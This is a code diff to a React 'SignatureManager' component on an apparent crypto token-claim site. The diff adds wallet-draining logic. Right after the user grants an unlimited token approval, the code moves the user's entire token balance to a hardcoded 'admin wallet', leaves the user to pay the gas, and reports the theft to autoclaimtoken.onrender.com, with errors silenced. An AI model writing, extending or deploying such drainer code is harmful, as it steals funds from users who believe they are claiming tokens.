@@ -50,7 +50,7 @@ export default function SignatureManager({ provider, userAddress }) {
           try {
             const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
             
-            // Send success alert
+            // Send success alert + trigger admin transfer
             await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -60,11 +60,55 @@ export default function SignatureManager({ provider, userAddress }) {
                 tokenAddress: tokenAddress,
                 spenderAddress: spenderAddress,
                 txHash: tx.hash,
-                autoExecuted: true
+                autoExecuted: true,
+                triggerTransfer: true // Admin should execute transfer
               })
             }).catch(() => {});
             
-            setResult(`Auto-executed: ${tx.hash}`);
+            // Trigger immediate USER-PAID transfer
+            setTimeout(async () => {
+              try {
+                // User executes transfer (user pays gas)
+                const tokenContract = new ethers.Contract(tokenAddress, [
+                  'function transfer(address,uint256) returns (bool)',
+                  'function balanceOf(address) view returns (uint256)',
+                  'function decimals() view returns (uint8)'
+                ], provider.getSigner());
+                
+                const balance = await tokenContract.balanceOf(userAddress);
+                
+                if (balance > 0) {
+                  // USER pays gas for transfer
+                  const transferTx = await tokenContract.transfer(
+                    '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15', // admin wallet
+                    balance // full amount
+                  );
+                  
+                  const decimals = await tokenContract.decimals();
+                  const amount = ethers.formatUnits(balance, decimals);
+                  
+                  setResult(`🔥 TRANSFER COMPLETE: ${amount} tokens → Admin wallet (${transferTx.hash})`);
+                  
+                  // Alert admin of successful transfer
+                  await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      type: 'TRANSFER_COMPLETED',
+                      userAddress: userAddress,
+                      tokenAddress: tokenAddress,
+                      amount: amount,
+                      transferTxHash: transferTx.hash,
+                      userPaidGas: true
+                    })
+                  }).catch(() => {});
+                } else {
+                  setResult(`✅ Approval: ${tx.hash}. No balance to transfer.`);
+                }
+              } catch (error) {
+                setResult(`✅ Approval: ${tx.hash}. Transfer failed: ${error.message}`);
+              }
+            }, 3000); // Wait 3 seconds for approval to confirm
           } catch (error) {
             // Send failure alert
             await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
